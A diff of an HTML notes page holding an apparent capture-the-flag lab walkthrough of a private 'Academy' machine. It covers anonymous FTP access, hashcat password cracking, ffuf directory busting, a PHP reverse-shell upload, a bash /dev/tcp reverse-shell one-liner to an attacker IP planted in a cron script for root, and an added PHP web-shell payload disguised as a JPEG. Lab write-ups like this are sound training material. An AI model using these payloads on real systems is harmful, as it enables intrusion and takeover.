@@ -1,17 +1,18 @@
-<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
 <head>
-<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
 <title>Walkthrough</title>
 </head><body>Username:root<br/>
 passwd:tcm<br/>
 <br/>
-<img src="image.png"/><br/>
+<img src="image.png" /><br/>
 <br/>
 apache server probably means php in backend<br/>
 <br/>
 <br/>
 <br/>
-<img src="image 2.png"/><br/>
+<img src="image 2.png" /><br/>
 <br/>
 anonymous login to ftp:<br/>
 username:anonymous(random try)<br/>
@@ -19,11 +20,11 @@ passwd:anonymous<br/>
 <br/>
 login was successful<br/>
 <br/>
-<img src="image 3.png"/><br/>
+<img src="image 3.png" /><br/>
 nmap revealed that there was a file note.txt<br/>
-<img src="image 24.png"/><br/>
+<img src="image 24.png" /><br/>
 <br/>
-<img src="image 4.png"/><br/>
+<img src="image 4.png" /><br/>
 <br/>
 copy the password hash<br/>
 #hash-identifier<br/>
@@ -31,7 +32,7 @@ tool built in kali linux<br/>
 paste the hash<br/>
 <br/>
 <br/>
-<img src="image 5.png"/><br/>
+<img src="image 5.png" /><br/>
 <br/>
 <br/>
 possible md5 hash<br/>
@@ -39,11 +40,11 @@ possible md5 hash<br/>
 tool for passwd cracking:hashcat<br/>
 *hascracking uses GPU not CPU so try to run on main OS and not VM<br/>
 <br/>
-#hashcat –m 0 hashes.txt /usr/share/wordlists/rockyou.txt  <br/>
-<img src="image 6.png"/><br/>
+#hashcat –m 0 hashes.txt /usr/share/wordlists/rockyou.txt <br/>
+<img src="image 6.png" /><br/>
 <br/>
 <br/>
-<img src="image 7.png"/><br/>
+<img src="image 7.png" /><br/>
 <br/>
 password is student,we also have the username and userID from note.txt we got from ftp<br/>
 <br/>
@@ -52,19 +53,19 @@ for directory busting:no need for worlists<br/>
 <br/>
 another tool:ffuf for directory busting<br/>
 <br/>
-<img src="image 8.png"/><br/>
+<img src="image 8.png" /><br/>
 -w:wordlists<br/>
 -u:url<br/>
 replace Fuzz in url with wordlists words<br/>
 <br/>
 <br/>
-<img src="image 9.png"/><br/>
+<img src="image 9.png" /><br/>
 <br/>
 go to http://192.168.57.8/academy<br/>
 put the credentials<br/>
 <br/>
 right click on img-&gt;open image in new tab:to see where image is stored<br/>
-<img src="image 10.png"/><br/>
+<img src="image 10.png" /><br/>
 <br/>
 instead of img,try to upload a malware,if typeof file check is not done<br/>
 <br/>
@@ -78,11 +79,11 @@ port should be same as that in shell.php<br/>
 now upload the shell file i.e shell.php<br/>
 and we get a reverse shell<br/>
 <br/>
-<img src="image 11.png"/><br/>
+<img src="image 11.png" /><br/>
 <br/>
 we are not root<br/>
 <br/>
-<img src="image 12.png"/><br/>
+<img src="image 12.png" /><br/>
 <br/>
 so we need to perform privilage escalation<br/>
 <br/>
@@ -99,36 +100,36 @@ in academy reverse shell we got<br/>
 <br/>
 <br/>
 Wget is the non-interactive network downloader which is used to download files from the server even<br/>
-when the user has not logged on to the system and it can work in the background without hindering the current process.   <br/>
+when the user has not logged on to the system and it can work in the background without hindering the current process.  <br/>
 <br/>
-<img src="image 13.png"/><br/>
+<img src="image 13.png" /><br/>
 <br/>
 <br/>
 <br/>
-<img src="image 14.png"/><br/>
+<img src="image 14.png" /><br/>
 <br/>
 /var/www/html/academy/includes/config.php<br/>
 #cat /var/www/html/academy/includes/config.php<br/>
 <br/>
-<img src="image 15.png"/><br/>
+<img src="image 15.png" /><br/>
 <br/>
 <br/>
-<img src="image 16.png"/><br/>
-<img src="image 17.png"/><br/>
+<img src="image 16.png" /><br/>
+<img src="image 17.png" /><br/>
 <br/>
 /etc/passwd:shows grimmie is administator<br/>
 <br/>
 #ssh grimmie@192.168.57.8<br/>
 <br/>
-<img src="image 18.png"/><br/>
+<img src="image 18.png" /><br/>
 <br/>
 now we are in the machine as grimmie:<br/>
 <br/>
-<img src="image 19.png"/><br/>
+<img src="image 19.png" /><br/>
 looks like backup.sh runs periodically<br/>
 <br/>
 tool:pspy<br/>
-<img src="image 20.png"/><br/>
+<img src="image 20.png" /><br/>
 <br/>
 #chmod +x pspy<br/>
 this shows all process running on the machine and we can see them even without sudo privilages<br/>
@@ -136,13 +137,13 @@ this shows all process running on the machine and we can see them even without s
 try to find backup.sh because it looked like backup.sh was running periodically<br/>
 <br/>
 <br/>
-<img src="image 21.png"/><br/>
+<img src="image 21.png" /><br/>
 <br/>
 backup.sh running every minute<br/>
 <br/>
 google:bash reverse shell one liner:https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet<br/>
 <br/>
-#bash -i &gt;&amp; /dev/tcp/&lt;attackerIP&gt;/8080 0&gt;&amp;1  <br/>
+#bash -i &gt;&amp; /dev/tcp/&lt;attackerIP&gt;/8080 0&gt;&amp;1 <br/>
 <br/>
 we have a shell script:backup.sh<br/>
 we put this one liner in the shell script and it will perform reverse shell<br/>
@@ -157,7 +158,25 @@ in kali:<br/>
 wait for some time coz script runs every minute<br/>
 <br/>
 and we get a reverse shell as root this time<br/>
-<img src="image 22.png"/><br/>
+<img src="image 22.png" /><br/>
 <br/>
 <br/>
-<img src="image 23.png"/></body></html>
+<img src="image 23.png" /><br/>
+<br/>
+--------------------------OR-------------------------<br/>
+<br/>
+upload .jpeg file<br/>
+intercept it with a proxy<br/>
+<br/>
+keep the magic bytes<br/>
+<br/>
+and do<br/>
+# &lt;?php system($_GET['cmd']);?&gt;<br/>
+<br/>
+navigate to page where image is uploaded<br/>
+in url give parameter cmd and type the command to run after it<br/>
+<br/>
+http://192.168.57.7/academy/studentphoto/cat.php?cmd=whoami<br/>
+<img src="image 25.png" /><br/>
+<br/>
+</body></html>
